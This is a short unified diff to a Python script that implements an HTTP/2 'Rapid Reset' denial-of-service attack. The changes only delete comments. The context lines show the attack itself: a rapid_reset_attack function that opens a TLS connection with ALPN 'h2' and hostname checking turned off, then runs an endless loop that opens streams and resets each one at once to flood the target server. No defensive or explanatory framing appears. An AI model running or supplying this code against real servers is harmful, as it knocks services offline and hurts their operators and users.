@@ -4,7 +4,7 @@ import h2.connection
 import h2.events
 
 def rapid_reset_attack(target_host, target_port):
-    # Setup TLS with ALPN
+    
     context = ssl.create_default_context()
     context.set_alpn_protocols(['h2'])
     context.check_hostname = False
@@ -18,7 +18,7 @@ def rapid_reset_attack(target_host, target_port):
             ssock.sendall(conn.data_to_send())
             ssock.setblocking(False) 
 
-            # Rapid reset attack loop
+            
             stream_id = 1
             request_count = 0
             while True:
@@ -35,7 +35,7 @@ def rapid_reset_attack(target_host, target_port):
                     # Send RST_STREAM
                     conn.reset_stream(stream_id, error_code=0x0)
 
-                    # Try to send data
+                    
                     ssock.sendall(conn.data_to_send())
 
                     # Increment Stream ID (Must be odd for client-initiated)
